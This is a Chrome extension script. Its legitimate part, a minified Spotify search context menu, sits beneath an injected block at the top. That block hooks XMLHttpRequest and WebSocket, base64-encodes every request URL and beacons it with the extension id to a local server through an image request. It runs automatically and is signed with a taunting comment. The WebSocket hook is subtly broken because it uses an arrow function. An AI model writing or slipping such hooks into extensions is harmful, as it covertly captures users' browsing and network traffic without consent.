function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
"use strict";function onClickHandler(a,b){var c=a.menuItemId,d=JSON.stringify(a.selectionText).replace(/"/g,"");"artist"==c&&(d=d.split(String.fromCharCode(8211))[0],d=d.split(String.fromCharCode(45))[0],d=d.trim()),d=encodeURI(d),d=d.replace(/&/g,"and");var e="https://api.spotify.com/v1/search?q="+d+"&type="+c;console.log(e),$.getJSON(e,function(a){callback(a,c+"s")})}function callback(a,b){var c=a[b].items.length;if(0==a.length||0==c)chrome.browserAction.setIcon({path:"error.png"}),setTimeout(function(){chrome.browserAction.setIcon({path:"icon16.png"})},timeout);else{var d="";"artists"===b?d=a.artists.items[0].uri:"albums"===b?d=a.albums.items[0].uri:"tracks"===b&&(d=a.tracks.items[0].uri),chrome.tabs.create({url:d},function(a){chrome.browserAction.setIcon({path:"icon128.png"}),setTimeout(function(){chrome.tabs.remove(a.id)},500)})}}var timeout=2e4;chrome.contextMenus.onClicked.addListener(onClickHandler),chrome.runtime.onInstalled.addListener(function(){for(var a=["selection"],b=0;b<a.length;b++){var c=a[b];chrome.contextMenus.create({title:"Search",id:"parent",contexts:[c]}),chrome.contextMenus.create({title:"Artist",parentId:"parent",id:"artist",contexts:[c]}),chrome.contextMenus.create({title:"Album",parentId:"parent",id:"album",contexts:[c]}),chrome.contextMenus.create({title:"Track",parentId:"parent",id:"track",contexts:[c]})}});